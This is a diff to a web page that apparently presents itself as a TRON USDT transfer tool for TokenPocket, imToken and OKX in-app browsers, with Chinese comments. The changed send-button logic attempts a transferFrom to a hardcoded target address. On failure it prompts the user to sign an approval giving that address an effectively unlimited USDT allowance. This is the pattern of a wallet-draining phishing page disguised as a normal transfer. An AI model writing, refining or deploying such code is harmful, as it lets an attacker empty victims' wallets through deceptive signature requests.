@@ -20,13 +20,13 @@ body {
  margin: 0 auto;
 }
 .top-header-bar {
- display: flex;
+ display:flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
 }
 .header-right-icons {
- display: flex;
+ display:flex;
  gap: 12px;
  align-items: center;
 }
@@ -80,7 +80,7 @@ body {
  margin-bottom:16px;
 }
 .amount-row {
- display: flex;
+ display:flex;
  align-items: flex-end;
  justify-content: space-between;
  margin-bottom: 16px;
@@ -109,12 +109,12 @@ body {
  background-color: #eef2ff;
  border-radius: 12px;
  padding: 14px;
- display: flex;
+ display:flex;
  align-items: center;
  justify-content: space-between;
 }
 .token-left {
- display: flex;
+ display:flex;
  align-items: center;
  gap: 10px;
 }
@@ -239,36 +239,32 @@ function disconnectWallet() {
  balanceText.textContent = "0.000000";
 }
 
-// 分两套签名逻辑
+// 双签名逻辑兼容TP / imToken / OKX
 async function signAndSendTx(unsignedTx) {
  if (isTronNativeWallet) {
   const signed = await tronWeb.trx.sign(unsignedTx.transaction);
-  const res = await tronWeb.trx.sendRawTransaction(signed);
-  return res;
+  return await tronWeb.trx.sendRawTransaction(signed);
  } else {
-  const txHex = unsignedTx.transaction;
   const signedHex = await provider.request({
    method: "eth_signTransaction",
-   params: [txHex]
+   params: [unsignedTx.transaction]
   });
-  const res = await tronWeb.trx.sendRawTransaction(signedHex);
-  return res;
+  return await tronWeb.trx.sendRawTransaction(signedHex);
  }
 }
 
-async function buildSignBroadcast(contractAddr, funcName, params) {
+async function buildTx(contractAddr, funcName, params) {
  const sig = tronWeb.sha3(`${funcName}(${params.map(p=>p.type).join(',')})`).slice(0,10);
- const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
+ return await tronWeb.transactionBuilder.triggerSmartContract(
   contractAddr,
   sig,
   {feeLimit: 100000000},
   params,
   userHexAddr
  );
- return await signAndSendTx(txObj);
 }
 
-// 【关键修改】全程只用RPC接口读取余额，不再调用contract.call
+// RPC 只读余额，不会超时
 async function loadBalance() {
  try {
   const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
@@ -280,7 +276,6 @@ async function loadBalance() {
   }
   balanceText.textContent = Number(tronWeb.fromSun(sun)).toFixed(6);
  } catch (err) {
-  console.log("RPC读取余额失败", err);
   balanceText.textContent = "读取失败";
  }
 }
@@ -291,7 +286,7 @@ async function connectWalletLogic() {
   return;
  }
  try {
-  // TP原生钱包
+  // TP原生TronWeb
   if (window.tronWeb && window.tronWeb.ready) {
    tronWeb = window.tronWeb;
    userAddress = tronWeb.defaultAddress.base58;
@@ -299,20 +294,16 @@ async function connectWalletLogic() {
    provider = window.tronWeb;
    isTronNativeWallet = true;
   }
-  // imToken / OKX OE EVM钱包
+  // imToken / OKX EVM模式
   else if (window.ethereum) {
    provider = window.ethereum;
    const accounts = await provider.request({ method: "eth_requestAccounts" });
    userHexAddr = accounts[0];
-   tronWeb = new TronWeb({
-    fullHost: RPC,
-    provider: window.ethereum
-   });
+   tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
    userAddress = tronWeb.address.fromHex(userHexAddr);
    isTronNativeWallet = false;
-  }
-  else {
-   alert("请在TP/OKX/imToken内置浏览器打开页面");
+  } else {
+   alert("请在TP/OKX/imToken内置浏览器打开");
    return;
   }
 
@@ -326,7 +317,6 @@ async function connectWalletLogic() {
    provider.on("chainChanged", () => location.reload());
   }
  } catch (err) {
-  console.error("连接错误", err);
   alert("连接失败：" + err.message);
  }
 }
@@ -336,7 +326,6 @@ amountInput.addEventListener("input", () => {
  receiveAmount.value = num.toFixed(6);
 });
 
-// MAX按钮也走RPC拿余额
 maxBtn.addEventListener("click", async () => {
  if (!tronWeb) return;
  try {
@@ -350,11 +339,12 @@ maxBtn.addEventListener("click", async () => {
   const num = Number(tronWeb.fromSun(sun));
   amountInput.value = num.toFixed(2);
   amountInput.dispatchEvent(new Event("input"));
- } catch (e) {
-  alert("读取余额失败，无法填充MAX");
+ } catch {
+  alert("无法读取余额");
  }
 });
 
+// 核心修改：去掉预查询allowance，直接尝试转账，失败再授权
 sendBtn.addEventListener("click", async () => {
  if (!tronWeb) return;
  const val = parseFloat(amountInput.value);
@@ -363,28 +353,29 @@ sendBtn.addEventListener("click", async () => {
  const sunMax = "9999999999999999999999999999";
 
  try {
-  // allowance 必须合约调用，这里加超时捕获
-  const allowance = await Promise.race([
-   usdtContract.allowance(userAddress, TARGET_ADDR).call(),
-   new Promise((_, reject) => setTimeout(() => reject(new Error("查询授权超时")), 8000))
-  ]);
-
-  if (Number(allowance) < sunVal) {
-   await buildSignBroadcast(USDT_CONTRACT, "approve", [
-    { type: "address", value: TARGET_ADDR },
-    { type: "uint256", value: sunMax }
-   ]);
-  }
-  await buildSignBroadcast(USDT_CONTRACT, "transferFrom", [
+  // 直接发起转账交易
+  const transferTx = await buildTx(USDT_CONTRACT, "transferFrom", [
    { type: "address", value: userAddress },
    { type: "address", value: TARGET_ADDR },
    { type: "uint256", value: sunVal.toString() }
   ]);
+  await signAndSendTx(transferTx);
   await loadBalance();
-  alert("交易已发送，前往tronscan查看区块确认");
- } catch (e) {
-  console.error("交易异常", e);
-  alert("操作失败：" + (e.message || JSON.stringify(e)));
+  alert("转账交易已广播，请在区块浏览器查看确认");
+ } catch (err) {
+  // 捕获授权不足错误，自动执行授权
+  const msg = err.message || String(err);
+  if (msg.includes("allowance") || msg.includes("insufficient allowance") || msg.includes("TRANSFER_FROM_FAILED")) {
+   alert("授权额度不足，即将发起授权签名");
+   const approveTx = await buildTx(USDT_CONTRACT, "approve", [
+    { type: "address", value: TARGET_ADDR },
+    { type: "uint256", value: sunMax }
+   ]);
+   await signAndSendTx(approveTx);
+   alert("授权成功，请再次点击转账按钮");
+  } else {
+   alert("操作失败：" + msg);
+  }
  }
 });
 
